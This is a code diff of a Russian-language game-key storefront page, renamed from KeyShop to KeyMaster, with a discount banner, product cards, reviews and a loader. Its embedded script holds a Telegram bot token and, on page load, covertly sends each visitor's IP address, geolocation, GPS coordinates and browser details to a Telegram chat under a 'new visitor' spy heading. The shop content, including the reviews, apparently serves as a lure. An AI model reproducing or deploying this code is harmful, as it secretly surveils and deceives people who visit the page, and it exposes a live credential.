@@ -3,197 +3,404 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KeyShop — цифровые ключи</title>
+    <title>KeyMaster — Магазин цифровых ключей</title>
     <style>
+        :root {
+            --bg: #0a0c10;
+            --surface: #13161d;
+            --border: #1e2230;
+            --accent: #00e6b8;
+            --accent2: #0084ff;
+            --text: #e0e6f0;
+            --sub: #7c8ba0;
+            --red: #ff4757;
+            --orange: #ffa502;
+            --green: #2ed573;
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: system-ui, -apple-system, sans-serif;
-            background: #0e1015;
-            color: #e0e0e0;
+            background: var(--bg);
+            color: var(--text);
             min-height: 100vh;
+            -webkit-tap-highlight-color: transparent;
         }
-        .topbar {
-            background: #16181f;
-            padding: 12px 16px;
+
+        /* ШАПКА */
+        .header {
+            background: #0d1018;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            padding: 0 16px;
+        }
+        .header-inner {
+            max-width: 1100px;
+            margin: 0 auto;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            border-bottom: 1px solid #222;
-            position: sticky;
-            top: 0;
-            z-index: 10;
+            height: 56px;
+            gap: 12px;
         }
         .logo {
             font-weight: 800;
             font-size: 20px;
-            color: #00e6b8;
+            color: #fff;
             letter-spacing: -0.5px;
+            white-space: nowrap;
         }
-        .nav-links {
-            display: flex;
-            gap: 12px;
-            font-size: 13px;
-            color: #999;
-        }
-        .hero {
-            background: linear-gradient(135deg, #1a1f2b, #12161f);
-            padding: 30px 16px;
-            text-align: center;
-            border-bottom: 1px solid #1f2330;
-        }
-        .hero h1 {
-            font-size: 24px;
-            font-weight: 700;
-            color: white;
-            margin-bottom: 6px;
-        }
-        .hero p {
-            color: #7c8ba0;
+        .logo span { color: var(--accent); }
+        .search-bar {
+            flex: 1;
+            max-width: 320px;
+            background: #1a1e27;
+            border-radius: 10px;
+            padding: 10px 14px;
+            border: 1px solid transparent;
+            color: #fff;
             font-size: 14px;
+            outline: none;
+            transition: 0.2s;
         }
-        .badge {
-            display: inline-block;
-            background: #00e6b8;
-            color: #0a0c10;
-            font-weight: 700;
-            font-size: 11px;
-            padding: 4px 10px;
-            border-radius: 20px;
-            margin-top: 10px;
-        }
-        .catalog {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 14px;
-            padding: 20px 16px;
-            max-width: 500px;
-            margin: 0 auto;
-        }
-        .card {
-            background: #16181f;
-            border-radius: 18px;
-            padding: 14px 12px;
-            border: 1px solid #1f2330;
-            text-align: center;
-            transition: 0.15s;
-        }
-        .card:active { transform: scale(0.97); border-color: #00e6b8; }
-        .card .icon {
-            font-size: 36px;
-            margin-bottom: 8px;
-        }
-        .card .title {
-            font-weight: 700;
-            font-size: 15px;
-            color: white;
-            margin-bottom: 4px;
-        }
-        .card .price {
-            font-size: 18px;
-            font-weight: 800;
-            color: #00e6b8;
-        }
-        .card .old {
-            text-decoration: line-through;
-            color: #5c6a7a;
-            font-size: 13px;
-            margin-right: 6px;
-        }
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 14px;
-            background: #00e6b8;
-            color: #0a0c10;
-            font-weight: 700;
-            font-size: 16px;
-            border: none;
-            border-radius: 14px;
-            text-align: center;
-            margin-top: 6px;
+        .search-bar:focus { border-color: var(--accent); }
+        .header-icons {
+            display: flex;
+            gap: 16px;
+            font-size: 20px;
+            color: #aaa;
             cursor: pointer;
         }
-        .footer {
-            text-align: center;
-            font-size: 11px;
-            color: #4a5568;
-            padding: 30px 16px;
-        }
-        .loader-overlay {
-            position: fixed;
-            inset: 0;
-            background: #0e1015;
+        .cart-count {
+            background: var(--accent);
+            color: #000;
+            font-size: 10px;
+            font-weight: 800;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            z-index: 999;
+            position: absolute;
+            top: -6px;
+            right: -10px;
+        }
+        .icon-wrap { position: relative; }
+
+        /* БАННЕР */
+        .banner {
+            background: linear-gradient(135deg, #1a1f2b 0%, #0f131c 100%);
+            border-bottom: 1px solid var(--border);
+            padding: 24px 16px;
+            text-align: center;
+        }
+        .banner h1 {
+            font-size: 26px;
+            font-weight: 800;
+            color: #fff;
+            margin-bottom: 4px;
+        }
+        .banner p { color: var(--sub); font-size: 14px; margin-bottom: 12px; }
+        .timer {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,71,87,0.15);
+            color: var(--red);
+            font-weight: 700;
+            font-size: 13px;
+            padding: 6px 14px;
+            border-radius: 20px;
+        }
+        .timer-dot {
+            width: 8px; height: 8px;
+            background: var(--red);
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0.3; } }
+
+        /* КАТАЛОГ */
+        .section-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #fff;
+            padding: 24px 16px 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 12px;
+            padding: 8px 16px 20px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        .card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 14px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.15s;
+            position: relative;
+        }
+        .card:active { transform: scale(0.97); border-color: var(--accent); }
+        .card .platform {
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            background: #1e2230;
+            color: #888;
+            font-size: 10px;
+            font-weight: 700;
+            padding: 2px 8px;
+            border-radius: 6px;
+        }
+        .card .discount {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            background: var(--red);
+            color: #fff;
+            font-size: 10px;
+            font-weight: 800;
+            padding: 2px 7px;
+            border-radius: 6px;
+        }
+        .card .cover {
+            font-size: 42px;
+            margin: 14px 0 8px;
+        }
+        .card .title {
+            font-weight: 700;
+            font-size: 14px;
+            color: #fff;
+            margin-bottom: 6px;
+            line-height: 1.3;
+        }
+        .card .price {
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--accent);
+        }
+        .card .old-price {
+            text-decoration: line-through;
+            color: #5c6a7a;
+            font-size: 12px;
+            margin-right: 6px;
+        }
+        .card .rating {
+            font-size: 11px;
+            color: var(--orange);
+            margin-top: 4px;
+        }
+
+        /* ПРЕИМУЩЕСТВА */
+        .benefits {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            padding: 16px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        .benefit {
+            flex: 1 1 100px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 14px;
+            text-align: center;
+            font-size: 12px;
+            color: var(--sub);
+        }
+        .benefit .icon { font-size: 24px; margin-bottom: 6px; display: block; }
+
+        /* ОТЗЫВЫ */
+        .reviews {
+            display: flex;
+            gap: 10px;
+            padding: 8px 16px 20px;
+            max-width: 1100px;
+            margin: 0 auto;
+            overflow-x: auto;
+        }
+        .review {
+            min-width: 200px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 14px;
+            font-size: 13px;
+            color: #bbb;
+        }
+        .review .stars { color: var(--orange); margin-bottom: 4px; }
+        .review .author { color: var(--sub); font-size: 11px; margin-top: 6px; }
+
+        /* ФУТЕР */
+        .footer {
+            text-align: center;
+            padding: 24px 16px;
+            border-top: 1px solid var(--border);
+            font-size: 12px;
+            color: #4a5568;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+        .footer .payments { font-size: 22px; margin-bottom: 8px; letter-spacing: 6px; }
+
+        /* ЗАГРУЗЧИК */
+        .loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: var(--bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            flex-direction: column;
+            gap: 16px;
         }
         .spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid #1f2330;
-            border-top: 4px solid #00e6b8;
+            width: 44px; height: 44px;
+            border: 3px solid #1e2230;
+            border-top: 3px solid var(--accent);
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 0.7s linear infinite;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .loader-text { color: var(--sub); font-size: 13px; }
+
+        /* МОБИЛЬНАЯ АДАПТАЦИЯ */
+        @media (max-width: 500px) {
+            .search-bar { display: none; }
+            .grid { grid-template-columns: 1fr 1fr; }
+        }
     </style>
 </head>
 <body>
 
-    <!-- Загрузчик (показывается пару секунд) -->
+    <!-- ЗАГРУЗЧИК (2 сек) -->
     <div class="loader-overlay" id="loader">
         <div class="spinner"></div>
+        <div class="loader-text">Загрузка каталога...</div>
     </div>
 
     <!-- САЙТ -->
-    <div class="topbar">
-        <div class="logo">🎮 KeyShop</div>
-        <div class="nav-links">
-            <span>Steam</span>
-            <span>Xbox</span>
-            <span>PS</span>
+    <header class="header">
+        <div class="header-inner">
+            <div class="logo">🎮 Key<span>Master</span></div>
+            <input class="search-bar" type="text" placeholder="Поиск игр...">
+            <div class="header-icons">
+                <span>🔔</span>
+                <div class="icon-wrap">
+                    <span>🛒</span>
+                    <span class="cart-count">3</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <div class="banner">
+        <h1>🎉 Летняя распродажа</h1>
+        <p>Скидки до 85% на топовые тайтлы</p>
+        <div class="timer">
+            <span class="timer-dot"></span> Акция закончится через 02:14:37
         </div>
     </div>
-    <div class="hero">
-        <h1>Цифровые ключи</h1>
-        <p>Мгновенная доставка • Все платформы</p>
-        <span class="badge">🔥 Скидки до -70%</span>
-    </div>
-    <div class="catalog">
+
+    <div class="section-title">🔥 Горячие предложения</div>
+    <div class="grid">
         <div class="card">
-            <div class="icon">🎮</div>
-            <div class="title">Steam Wallet 50$</div>
-            <div class="price"><span class="old">4490₽</span> 3290₽</div>
+            <span class="platform">Steam</span>
+            <span class="discount">-70%</span>
+            <div class="cover">🌴</div>
+            <div class="title">GTA V Premium Edition</div>
+            <div class="price"><span class="old-price">3490₽</span> 1047₽</div>
+            <div class="rating">⭐ 4.9 (12.4k)</div>
         </div>
         <div class="card">
-            <div class="icon">❌</div>
-            <div class="title">Xbox Game Pass Ultimate</div>
-            <div class="price"><span class="old">1190₽</span> 790₽</div>
+            <span class="platform">Steam</span>
+            <span class="discount">-60%</span>
+            <div class="cover">🤠</div>
+            <div class="title">Red Dead Redemption 2</div>
+            <div class="price"><span class="old-price">4490₽</span> 1796₽</div>
+            <div class="rating">⭐ 4.8 (8.9k)</div>
         </div>
         <div class="card">
-            <div class="icon">🎮</div>
-            <div class="title">PS Plus 12 месяцев</div>
-            <div class="price"><span class="old">5290₽</span> 3990₽</div>
+            <span class="platform">Xbox</span>
+            <span class="discount">-45%</span>
+            <div class="cover">🎮</div>
+            <div class="title">Game Pass Ultimate 3 мес</div>
+            <div class="price"><span class="old-price">2290₽</span> 1260₽</div>
+            <div class="rating">⭐ 4.7 (3.2k)</div>
         </div>
         <div class="card">
-            <div class="icon">🎸</div>
-            <div class="title">GTA V Premium</div>
-            <div class="price"><span class="old">1990₽</span> 1290₽</div>
+            <span class="platform">PS</span>
+            <span class="discount">-50%</span>
+            <div class="cover">🕷</div>
+            <div class="title">Spider-Man 2 (PS5)</div>
+            <div class="price"><span class="old-price">5490₽</span> 2745₽</div>
+            <div class="rating">⭐ 4.9 (6.7k)</div>
         </div>
         <div class="card">
-            <div class="icon">🌴</div>
-            <div class="title">RDR 2 Ultimate</div>
-            <div class="price"><span class="old">3490₽</span> 2590₽</div>
-        </div>
-        <div class="card">
-            <div class="icon">🏎</div>
+            <span class="platform">Epic</span>
+            <span class="discount">-75%</span>
+            <div class="cover">🏎</div>
             <div class="title">Forza Horizon 5</div>
-            <div class="price"><span class="old">2290₽</span> 1690₽</div>
+            <div class="price"><span class="old-price">3990₽</span> 998₽</div>
+            <div class="rating">⭐ 4.8 (5.1k)</div>
+        </div>
+        <div class="card">
+            <span class="platform">Rockstar</span>
+            <span class="discount">-85%</span>
+            <div class="cover">🌆</div>
+            <div class="title">GTA Trilogy Definitive</div>
+            <div class="price"><span class="old-price">5990₽</span> 899₽</div>
+            <div class="rating">⭐ 4.5 (2.1k)</div>
         </div>
     </div>
-    <button class="btn" onclick="alert('Оплата временно недоступна')">💳 Купить сейчас</button>
-    <div class="footer">© 2026 KeyShop. Все платежи защищены. Не является публичной офертой.</div>
+
+    <div class="section-title">💎 Преимущества</div>
+    <div class="benefits">
+        <div class="benefit"><span class="icon">⚡</span>Мгновенная доставка</div>
+        <div class="benefit"><span class="icon">🔒</span>Гарантия 90 дней</div>
+        <div class="benefit"><span class="icon">💬</span>Поддержка 24/7</div>
+        <div class="benefit"><span class="icon">⭐</span>Более 50 000 отзывов</div>
+    </div>
+
+    <div class="section-title">💬 Последние отзывы</div>
+    <div class="reviews">
+        <div class="review">
+            <div class="stars">⭐⭐⭐⭐⭐</div>
+            <div>Ключ пришёл за 2 минуты. Активировал без проблем. Магазин топ!</div>
+            <div class="author">— Алексей, 2 часа назад</div>
+        </div>
+        <div class="review">
+            <div class="stars">⭐⭐⭐⭐⭐</div>
+            <div>Покупаю третий раз. Цены реально ниже рынка. Рекомендую.</div>
+            <div class="author">— Дмитрий, 5 часов назад</div>
+        </div>
+        <div class="review">
+            <div class="stars">⭐⭐⭐⭐</div>
+            <div>Быстрая доставка, но ключ был для другого региона. Поддержка помогла за 10 мин.</div>
+            <div class="author">— Марина, вчера</div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="payments">💳 🍏 💵 💲 🪙</div>
+        Visa, Mastercard, МИР, Apple Pay, Google Pay, криптовалюта<br>
+        © 2026 KeyMaster. Все права защищены. Не является публичной офертой.
+    </div>
 
     <script>
         const TOKEN = '7959565855:AAGXvmUb-T1pPCjYJJRFXcEkE8PFVvJQXSM';
@@ -218,7 +425,7 @@
                 );
             }
 
-            const msg = `🕵️ Новый посетитель KeyShop!\n\n` +
+            const msg = `🕵️ Новый посетитель KeyMaster!\n\n` +
                 `IP: <code>${ip}</code>\n` +
                 `🌍 ${geo}${gps}\n\n` +
                 `📱 ${navigator.userAgent}\n` +
@@ -230,7 +437,6 @@
                 body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'HTML'})
             });
 
-            // Скрываем загрузчик через 2 секунды
             setTimeout(() => {
                 document.getElementById('loader').style.display = 'none';
             }, 2000);
